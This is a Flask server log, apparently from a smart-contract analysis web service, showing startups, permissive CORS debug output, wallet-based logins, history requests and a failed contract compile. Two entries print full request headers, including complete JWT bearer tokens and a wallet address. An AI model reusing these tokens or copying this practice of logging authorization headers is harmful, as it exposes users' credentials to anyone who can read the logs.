2025-06-23 08:52:24,125 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 08:52:24,297 - app.app - INFO - Application started
2025-06-23 08:52:24,309 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.30.0.5:8000
2025-06-23 08:52:24,310 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 08:52:28,473 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 08:52:28,476 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NzIyNDR9.9T49g2ZMD9Uk6t3m_dtdiGZ9z7CBadiojJh3-f3tYR4', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 08:52:28,478 - app.api.auth - INFO - Request content type: application/json
2025-06-23 08:52:28,480 - app.api.auth - INFO - Processing JSON request
2025-06-23 08:52:28,482 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:52:28,946 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:52:28,950 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:52:28,951 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:52:28,954 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:52:28,957 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:52:28,960 - werkzeug - INFO - 172.30.0.1 - - [23/Jun/2025 08:52:28] "POST /login HTTP/1.1" 200 -
2025-06-23 08:52:46,276 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:52:46,281 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:52:46,284 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:52:46,287 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 08:52:46,292 - werkzeug - INFO - 172.30.0.1 - - [23/Jun/2025 08:52:46] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 08:52:46,305 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 08:52:46,308 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 08:52:46,312 - app.api.auth - INFO - Request content type: application/json
2025-06-23 08:52:46,314 - app.api.auth - INFO - Processing JSON request
2025-06-23 08:52:46,318 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:52:46,721 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:52:46,723 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:52:46,725 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:52:46,726 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:52:46,728 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:52:46,729 - werkzeug - INFO - 172.30.0.1 - - [23/Jun/2025 08:52:46] "POST /login HTTP/1.1" 200 -
2025-06-23 08:52:48,386 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:52:48,391 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:52:48,395 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:52:48,398 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 08:52:48,402 - werkzeug - INFO - 172.30.0.1 - - [23/Jun/2025 08:52:48] "OPTIONS /history HTTP/1.1" 200 -
2025-06-23 08:52:48,469 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:52:48,471 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:52:48,472 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:52:48,473 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:52:48,475 - werkzeug - INFO - 172.30.0.1 - - [23/Jun/2025 08:52:48] "GET /history HTTP/1.1" 200 -
2025-06-23 08:53:54,124 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 08:53:54,284 - app.app - INFO - Application started
2025-06-23 08:53:54,295 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.16.5:8000
2025-06-23 08:53:54,296 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 07:47:46,555 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 07:47:46,717 - app.app - INFO - Application started
2025-06-23 07:47:46,728 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.25.0.5:8000
2025-06-23 07:47:46,729 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 07:47:57,703 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:47:57,712 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:47:57,731 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:47:57,743 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:47:57,755 - werkzeug - INFO - 172.25.0.1 - - [23/Jun/2025 07:47:57] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 07:47:57,776 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 07:47:57,784 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NjcyMjB9.VSmU8NOkt3c7ruJwPBz1bErzbtCrTO4jSRNW6WVLhak', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 07:47:57,789 - app.api.auth - INFO - Request content type: application/json
2025-06-23 07:47:57,796 - app.api.auth - INFO - Processing JSON request
2025-06-23 07:47:57,801 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:47:58,367 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:47:58,371 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:47:58,373 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:47:58,375 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:47:58,377 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:47:58,379 - werkzeug - INFO - 172.25.0.1 - - [23/Jun/2025 07:47:58] "POST /login HTTP/1.1" 200 -
2025-06-23 07:48:14,252 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:48:14,257 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:48:14,260 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:48:14,263 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:48:14,268 - werkzeug - INFO - 172.25.0.1 - - [23/Jun/2025 07:48:14] "OPTIONS /history HTTP/1.1" 200 -
2025-06-23 07:48:14,338 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:48:14,340 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:48:14,342 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:48:14,343 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:48:14,345 - werkzeug - INFO - 172.25.0.1 - - [23/Jun/2025 07:48:14] "GET /history HTTP/1.1" 200 -
2025-06-23 07:48:26,096 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:48:26,103 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:48:26,107 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:48:26,111 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:48:26,116 - werkzeug - INFO - 172.25.0.1 - - [23/Jun/2025 07:48:26] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 07:48:26,138 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:48:26,150 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 07:48:26,157 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 07:48:26,162 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp4rux8nyy.sol
2025-06-23 07:48:26,175 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 07:48:26,176 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 07:48:26,186 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-23 07:48:26,188 - app.services.contract_service - WARNING - No contracts compiled
2025-06-23 07:48:26,189 - app.services.contract_service - INFO - Temporary file /tmp/tmp4rux8nyy.sol removed
2025-06-23 07:48:26,190 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-23 07:48:26,194 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:48:26,195 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:48:26,197 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:48:26,198 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:48:26,200 - werkzeug - INFO - 172.25.0.1 - - [23/Jun/2025 07:48:26] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-23 07:59:47,920 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 07:59:48,085 - app.app - INFO - Application started
2025-06-23 07:59:48,096 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.27.0.4:8000
2025-06-23 07:59:48,098 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
